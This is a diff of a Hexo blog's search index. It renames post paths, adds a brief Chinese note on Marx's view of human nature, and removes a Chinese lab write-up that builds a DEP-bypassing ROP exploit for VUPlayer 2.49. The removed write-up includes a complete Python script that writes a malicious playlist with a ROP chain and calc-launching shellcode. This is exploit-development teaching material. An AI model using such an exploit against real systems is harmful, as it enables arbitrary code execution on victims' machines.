+<p><a href="https://www.zhihu.com/question/626921129/answer/3258747740?utm_campaign=&utm_medium=social&utm_oi=1323630258282000384&utm_psn=1699919819036532736&utm_source=qq">马克思对人性的观点</a></p>
+<ul>
+<li>民主程度，取决于民众对官僚的威慑力度。</li>
+<li>人性随生产力变化而变化，制度随生产力变化而变化；而不是不变的人性形成不变的制度。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>社科知识</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Create a Blog with Hexo</title>
-    <url>/2023/10/17/Create-a-Blog-with-Hexo/</url>
+    <url>/2023/10/17/else/Create-a-Blog-with-Hexo/</url>
     <content><![CDATA[<p><code>Windows</code>下使用 <code>Hexo</code> 和 <code>github pages</code> 快速构建个人博客，</p>
 <p>并针对<code>next</code>主题进行如下配置：修改语言、切换小主题、添加分类标签、文章折叠、本地搜索等。</p>
 <span id="more"></span>
@@ -512,129 +756,32 @@
   </entry>
   <entry>
     <title>Create a Plugin for Immunity Debugger</title>
-    <url>/2023/10/23/Create-a-Plugin-for-Immunity-Debugger/</url>
+    <url>/2023/10/23/Windwos-PWN/Create-a-Plugin-for-Immunity-Debugger/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>Exploitme3——ROP without ASLR</title>
-    <url>/2023/10/20/Exploitme-ROP/</url>
-    <content><![CDATA[<p>当程序开启数据执行保护（DEP）后，我们无法在栈上执行<code>shellcode</code>，但可以利用程序中自带的代码片段（gadget），使<code>ret</code>指令和栈数据相配合，将 <code>gadget</code>串成一串，也能起到<code>shellcode</code>的效果，这就是返回导向编程<code>ROP</code>。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://www.freebuf.com/articles/system/173654.html">Windows漏洞利用开发：返回导向编程(ROP)</a></li>
-</ul>
+    <title>Hello World</title>
+    <url>/2023/10/17/else/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
 
-<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul>
-<li><p>Immunity Debugger : 一个windows下由纯python编写的调试器，有丰富的python安全工具库。</p>
-<ul>
-<li>下载链接：<a href="https://github.com/kbandla/ImmunityDebugger/releases">ImmunityDebugger</a></li>
-</ul>
-</li>
-<li><p>mona插件：将mona.py放到Immunity Debugger 的PyCommands目录下即可</p>
-<ul>
-<li>下载链接：<a href="https://github.com/corelan/mona/raw/master/mona.py">mona.py</a></li>
-</ul>
-</li>
-<li><p>VUPlayer ： 一个小巧的音乐播放器。2.49版本在打开 play list 时存在缓冲区溢出漏洞。</p>
-<ul>
-<li>下载链接：<a href="https://www.exploit-db.com/exploits/40018">VUPlayer 2.49</a></li>
-</ul>
-</li>
-<li><p>DEP：开启操作系统的<code>DEP</code>设置（WIN10下：设置—系统—关于—高级系统设置—性能-设置—数据执行保护—选中“DEP(U)”）</p>
-</li>
-<li><p>随机基址(ASLR): 关闭</p>
-</li>
-</ul>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><h3 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h3><p>编写python脚本，生成一个 test.m3u</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">3000</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
-<p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确定存在栈溢出漏洞</p>
-<p><img src="/../pic/Exploitme-ROP/EIP41414141.png" alt="EIP41414141"></p>
-<h3 id="确认偏移量"><a href="#确认偏移量" class="headerlink" title="确认偏移量"></a>确认偏移量</h3><p>在windbg中输入以下命令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_create 3000</span><br><span class="line">或者</span><br><span class="line">!py mona pc 3000</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>将得到的3000个字符拷贝到<code>test.m3u</code>文件，重复之前的操作，得到</p>
-<p><img src="/../pic/Exploitme-ROP/EIPpattern.png" alt="EIPpattern"></p>
-<p>之后执行以下命令，确定偏移量（偏移量指输入点距栈中返回地址之间的字节数）：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!py mona pattern_offset 68423768</span><br><span class="line">或</span><br><span class="line">!py mona po 0x68423768  # 0x可以省略</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>得到</p>
-<p><img src="/../pic/Exploitme-ROP/mona_po.png" alt="mona_po"></p>
-<p>确定偏移量为 1012 。</p>
-<p>使用以下脚本，重复操作，测试偏移量是否正确：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">payload = &quot;A&quot;*1012 + &quot;B&quot;*4</span><br><span class="line">file = open(&#x27;test.m3u&#x27;,&#x27;w&#x27;)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-
-<p>看到 EIP 成功被 0x42424242 覆盖，偏移量正确</p>
-<p><img src="/../pic/Exploitme-ROP/EIP42424242.png" alt="EIP42424242"></p>
-<h3 id="直接在栈上执行shellcode"><a href="#直接在栈上执行shellcode" class="headerlink" title="直接在栈上执行shellcode"></a>直接在栈上执行shellcode</h3><h4 id="搜索跳转指令"><a href="#搜索跳转指令" class="headerlink" title="搜索跳转指令"></a>搜索跳转指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!py mona j -r esp</span><br></pre></td></tr></table></figure>
-
-<p>得到以下输出</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Writing results to jmp.txt</span><br><span class="line">    - Number of pointers of type &#x27;jmp esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;call esp&#x27; : 7 </span><br><span class="line">    - Number of pointers of type &#x27;push esp # ret &#x27; : 1 </span><br><span class="line">[+] Results : </span><br><span class="line">0x1000d0ff |   0x1000d0ff : jmp esp | null &#123;PAGE_EXECUTE_READWRITE&#125; [BASS.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASS.dll), 0x0</span><br><span class="line">0x1010539f |   0x1010539f : jmp esp |  &#123;PAGE_EXECUTE_READWRITE&#125; [BASSWMA.dll] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v2.3.0.3 (D:\VulnTest\VUPlayer\BASSWMA.dll), 0x0</span><br><span class="line">...、、</span><br><span class="line">    Found a total of 15 pointers</span><br><span class="line"></span><br><span class="line">[+] This mona.py action took 0:00:04.439000</span><br></pre></td></tr></table></figure>
-
-<h4 id="尝试执行栈上指令"><a href="#尝试执行栈上指令" class="headerlink" title="尝试执行栈上指令"></a>尝试执行栈上指令</h4><p>选用 <code>0x1010539f</code>（<code>0x1000d0ff</code>存在”<code>\x00</code>“，不能正常工作）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">1012</span> + <span class="string">b&quot;\x9f\x53\x10\x10&quot;</span> + <span class="string">b&quot;\xcc&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-
-<p>在windbg下打开<code>VMPlayer</code>，拖入<code>test.m3u</code>文件，得到以下结果：</p>
-<p><img src="/../pic/Exploitme-ROP/DEP_c0000005.png" alt="dep_red"></p>
-<p>说明开启了<code>DEP</code>防护，无法直接执行shellcode。</p>
-<h3 id="构造ROP使用绕过DEP"><a href="#构造ROP使用绕过DEP" class="headerlink" title="构造ROP使用绕过DEP"></a>构造ROP使用绕过DEP</h3><p>我们需要使用<code>ROP</code>调用<code>VirtualProtect</code>函数，以关闭shellcode所在页的<code>DEP</code>保护。</p>
-<h4 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h4><p>首先介绍VirtualProtect函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOL VirtualProtect (</span><br><span class="line">	LPVOID lpAddress, 	# 要改变属性的内存起始地址</span><br><span class="line">	DWORD dwSize,		# 要改百年属性的内存字节数</span><br><span class="line">	DWORD flNewProtect,	# 输入新的页属性</span><br><span class="line">	PDWORD lpflOldProtect # 返回旧的页属性</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<p>页属性为 <code>PAGE_EXECUTE_READWRITE(0x40)</code>时，该页可读可写可执行。</p>
-<p>我们的调用参数应该如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">VirtualProtect</span> <span class="params">(</span></span><br><span class="line"><span class="params">	shellcode_addr，# shellcode起始地址</span></span><br><span class="line"><span class="params">    shellcode_len, 	# 不小于shellcode长度，比如 <span class="number">0x201</span>(常用)</span></span><br><span class="line"><span class="params">    <span class="number">0x40</span>,			# PAGE_EXECUTE_READWRITE</span></span><br><span class="line"><span class="params">    某个可写地址，</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
-
-<h4 id="mona搜索ROPChain"><a href="#mona搜索ROPChain" class="headerlink" title="mona搜索ROPChain"></a>mona搜索ROPChain</h4><ul>
-<li>优先使用程序本身的<code>dll</code>而不是系统库，前者没开启<code>ASLR</code>，即便系统重启，<code>payload</code>仍有效。</li>
-<li><code>-cp nonull</code> 避免出现”<code>\x00</code>“字节导致<code>payload</code>被截断</li>
-<li><code>mona</code>可以设置日志文件的存放目录（目录路径不要加双引号）</li>
-</ul>
-<p><code>windbg</code>下执行以下命令，由于缺少符文报错，尝试<code>immunity debugger</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!py mona rop -m <span class="string">&quot;bass,basswma,bassmidi&quot;</span> -cp nonull</span><br></pre></td></tr></table></figure>
-
-<p><code>immunity debugger</code>下执行以下命令：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">!mona config -set workingfolder D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme-ROP\mona-log</span><br><span class="line">!mona rop -m &quot;bass,basswma,bassmidi&quot; -cp nonull</span><br></pre></td></tr></table></figure>
-
-<p>成功执行，输出信息如下：</p>
-<p><img src="/../pic/Exploitme-ROP/immu-mona-rop.png" alt="immu-mona-rop"></p>
-<p>在日志目录下生成了以下几个文件：</p>
-<p><img src="/../pic/Exploitme-ROP/mona-log.png" alt="mona-log"></p>
-<p>查看<code>rop_chains.txt</code>，其中包含建议使用的<code>rop_chain</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Register setup for VirtualProtect() :</span><br><span class="line">--------------------------------------------</span><br><span class="line"> EAX = NOP (0x90909090)</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = ReturnTo (ptr to jmp esp)</span><br><span class="line"> ESI = ptr to VirtualProtect()</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> --- alternative chain ---</span><br><span class="line"> EAX = ptr to &amp;VirtualProtect()</span><br><span class="line"> ECX = lpOldProtect (ptr to W address)</span><br><span class="line"> EDX = NewProtect (0x40)</span><br><span class="line"> EBX = dwSize</span><br><span class="line"> ESP = lPAddress (automatic)</span><br><span class="line"> EBP = POP (skip 4 bytes)</span><br><span class="line"> ESI = ptr to JMP [EAX]</span><br><span class="line"> EDI = ROP NOP (RETN)</span><br><span class="line"> + place ptr to &quot;jmp esp&quot; on stack, below PUSHAD</span><br><span class="line"> ...</span><br><span class="line"> def create_rop_chain():</span><br><span class="line">    # rop chain generated with mona.py - www.corelan.be</span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      #[---INFO:gadgets_to_set_esi:---]</span><br><span class="line">      0x10015f82,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x1060e25c,  # ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span><br><span class="line">      0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span><br><span class="line">      0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ebp:---]</span><br><span class="line">      </span><br><span class="line">      0x1001d748,  # POP EBP # RETN [BASS.dll] </span><br><span class="line">      0x1010539f,  # &amp; jmp esp [BASSWMA.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_ebx:---]</span><br><span class="line">      0x10015f77,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xfffffdff,  # Value to negate, will become 0x00000201</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_edx:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0xffffffc0,  # Value to negate, will become 0x00000040</span><br><span class="line">      0x10014db4,  # NEG EAX # RETN [BASS.dll] </span><br><span class="line">      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] </span><br><span class="line">      #[---INFO:gadgets_to_set_ecx:---]</span><br><span class="line">      0x101012e0,  # POP ECX # RETN [BASSWMA.dll] </span><br><span class="line">      0x1003f0cc,  # &amp;Writable location [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_edi:---]</span><br><span class="line">      0x10603658,  # POP EDI # RETN [BASSMIDI.dll] </span><br><span class="line">      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]</span><br><span class="line">      #[---INFO:gadgets_to_set_eax:---]</span><br><span class="line">      0x10015fe7,  # POP EAX # RETN [BASS.dll] </span><br><span class="line">      0x90909090,  # nop</span><br><span class="line">      #[---INFO:pushad:---]</span><br><span class="line">      0x1001d7a5,  # PUSHAD # RETN [BASS.dll] </span><br><span class="line">    ]</span><br><span class="line">    return &#x27;&#x27;.join(struct.pack(&#x27;&lt;I&#x27;, _) for _ in rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br></pre></td></tr></table></figure>
-
-<h4 id="RopChain分析"><a href="#RopChain分析" class="headerlink" title="RopChain分析"></a>RopChain分析</h4><p><code>ropchain</code>是十分精巧的。ropchain的主要目的是为 <code>VirtualProtect()</code> 提供参数和控制执行流。</p>
-<p>在执行完<code>pushad</code>之后，栈中数据的内容应该如下：</p>
-<ul>
-<li><code>_edi</code> 表示执行<code>pushad</code>前对应寄存器中的值</li>
-<li><code>-&gt; &lt;func&gt;</code> 表示<code>&lt;func&gt;</code>的地址</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_edi # -&gt; retn</span><br><span class="line">_esi # -&gt; vitrualprotect</span><br><span class="line">_ebp # -&gt; jump esp</span><br><span class="line">_esp # shllcode的起始地址</span><br><span class="line">_ebx # 0x201</span><br><span class="line">_edx # 0x40</span><br><span class="line">_ecx # 0x1003f0cc，一个可写地址</span><br><span class="line">_eax # nop</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>
-
-<p>执行了<code>pushad</code>之后，<code>retn</code>指令从栈顶端取出新的指令地址，并跳转至该地址开始执行，发现还是个<code>retn</code>，重复之前过程，便将控制流指向了<code>VirtualProtect</code>函数。</p>
-<p><code>VirtualProtect</code>函数将<code>_ebp</code>看作返回地址，将再下面的四个值看作四个输入的参数，函数效果为关闭<code>shellcode</code>所在页内存的<code>DEP</code>保护。<code>_eax</code>没用。</p>
-<p>执行完后，<code>jump esp</code>便将执行流转到<code>shellcode</code>。</p>
-<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><p>完整的<code>exp</code>如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_rop_chain</span>():</span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x10015f82</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1060e25c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT BASSMIDI.dll]</span></span><br><span class="line">      <span class="number">0x1001eaf1</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10030950</span>,  <span class="comment"># XCHG EAX,ESI # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x1001d748</span>,  <span class="comment"># POP EBP # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x1010539f</span>,  <span class="comment"># &amp; jmp esp [BASSWMA.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x10015f77</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10032f32</span>,  <span class="comment"># XCHG EAX,EBX # RETN 0x00 [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10014db4</span>,  <span class="comment"># NEG EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x10038a6d</span>,  <span class="comment"># XCHG EAX,EDX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x101012e0</span>,  <span class="comment"># POP ECX # RETN [BASSWMA.dll] </span></span><br><span class="line">      <span class="number">0x1003f0cc</span>,  <span class="comment"># &amp;Writable location [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10603658</span>,  <span class="comment"># POP EDI # RETN [BASSMIDI.dll] </span></span><br><span class="line">      <span class="number">0x1001dc05</span>,  <span class="comment"># RETN (ROP NOP) [BASS.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x10015fe7</span>,  <span class="comment"># POP EAX # RETN [BASS.dll] </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1001d7a5</span>,  <span class="comment"># PUSHAD # RETN [BASS.dll] </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line">    </span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line">shellcode = (<span class="string">b&quot;\xe8\xff\xff\xff\xff\xc0\x5f\xb9\x11\x03\x02\x02\x81\xf1\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x02\x02\x83\xc7\x1d\x33\xf6\xfc\x8a\x07\x3c\x02\x0f\x44\xc6\xaa&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xe2\xf6\x55\x8b\xec\x83\xec\x0c\x56\x57\xb9\x7f\xc0\xb4\x7b\xe8&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x55\x02\x02\x02\xb9\xe0\x53\x31\x4b\x8b\xf8\xe8\x49\x02\x02\x02&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8b\xf0\xc7\x45\xf4\x63\x61\x6c\x63\x6a\x05\x8d\x45\xf4\xc7\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf8\x2e\x65\x78\x65\x50\xc6\x45\xfc\x02\xff\xd7\x6a\x02\xff\xd6&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5f\x33\xc0\x5e\x8b\xe5\x5d\xc3\x33\xd2\xeb\x10\xc1\xca\x0d\x3c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x61\x0f\xbe\xc0\x7c\x03\x83\xe8\x20\x03\xd0\x41\x8a\x01\x84\xc0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x75\xea\x8b\xc2\xc3\x8d\x41\xf8\xc3\x55\x8b\xec\x83\xec\x14\x53&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x56\x57\x89\x4d\xf4\x64\xa1\x30\x02\x02\x02\x89\x45\xfc\x8b\x45&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xfc\x8b\x40\x0c\x8b\x40\x14\x8b\xf8\x89\x45\xec\x8b\xcf\xe8\xd2&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x8b\x3f\x8b\x70\x18\x85\xf6\x74\x4f\x8b\x46\x3c\x8b&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x5c\x30\x78\x85\xdb\x74\x44\x8b\x4c\x33\x0c\x03\xce\xe8\x96\xff&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\x8b\x4c\x33\x20\x89\x45\xf8\x03\xce\x33\xc0\x89\x4d\xf0&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x89\x45\xfc\x39\x44\x33\x18\x76\x22\x8b\x0c\x81\x03\xce\xe8\x75&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xff\xff\xff\x03\x45\xf8\x39\x45\xf4\x74\x1e\x8b\x45\xfc\x8b\x4d&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\xf0\x40\x89\x45\xfc\x3b\x44\x33\x18\x72\xde\x3b\x7d\xec\x75\x9c&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x33\xc0\x5f\x5e\x5b\x8b\xe5\x5d\xc3\x8b\x4d\xfc\x8b\x44\x33\x24&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x8d\x04\x48\x0f\xb7\x0c\x30\x8b\x44\x33\x1c\x8d\x04\x88\x8b\x04&quot;</span>+</span><br><span class="line">        <span class="string">b&quot;\x30\x03\xc6\xeb\xdd&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">1012</span> + rop_chain + shellcode</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;payload.m3u&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
-
-<h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><p>运行<code>exp.py</code>，将生成的<code>payload.m3u</code>拖入<code>VUPlayer</code>，成功弹出计算器，如图：</p>
-<p><img src="/../pic/Exploitme-ROP/pwn.png" alt="pwn"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li><code>mona</code>在<code>Immunity debugger</code>中比在<code>Windbg</code>中更好用，虽然后者更美观。</li>
-<li><code>mona</code>很智能，生成的<code>rop_chains.txt</code>中的<code>ropchain</code>可以直接使用。</li>
-</ol>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
-      <categories>
-        <category>Windows-PWN</category>
-      </categories>
   </entry>
   <entry>
     <title>Exploitme——栈上执行Shellcode</title>
-    <url>/2023/10/19/Exploitme/</url>
+    <url>/2023/10/19/Windwos-PWN/Exploitme/Exploitme1/</url>
     <content><![CDATA[<p>参考链接</p>
 <ul>
 <li><a href="https://tttang.com/archive/680/#toc_0x01-exploitme1-ret-eip-overwrite-more-space-on-stack">Exploit开发系列教程-Exploitme1 (“ret eip” overwrite) &amp;More space on stack - 跳跳糖 (tttang.com)</a></li>
@@ -752,7 +899,7 @@
   </entry>
   <entry>
     <title>Exploitme2——Stack cookies &amp; SEH</title>
-    <url>/2023/10/24/Exploitme2/</url>
+    <url>/2023/10/24/Windwos-PWN/Exploitme/Exploitme2/</url>
     <content><![CDATA[<p>当程序开启<code>GS</code>保护时，我们无法再通过栈溢出覆盖返回地址的方式，来控制执行流。但还有一些其他的方式，比如劫持<code>SEH</code>。</p>
 <p>参考链接：</p>
 <ul>
@@ -901,51 +1048,125 @@
       </categories>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2023/10/17/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<span id="more"></span>
-
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>社科知识</title>
-    <url>/2023/10/23/%E7%A4%BE%E7%A7%91%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>介绍一些基础的社科知识，主要包括源自启蒙时代的一系列概念，以及一些我认为有价值的观点的介绍。</p>
-<span id="more"></span>
-
-
-
-<p><a href="https://www.zhihu.com/question/626921129/answer/3258747740?utm_campaign=&utm_medium=social&utm_oi=1323630258282000384&utm_psn=1699919819036532736&utm_source=qq">马克思对人性的观点</a></p>
+    <title>Exploitme3——ROP without ASLR</title>
+    <url>/2023/10/20/Windwos-PWN/Exploitme/Exploitme3/</url>
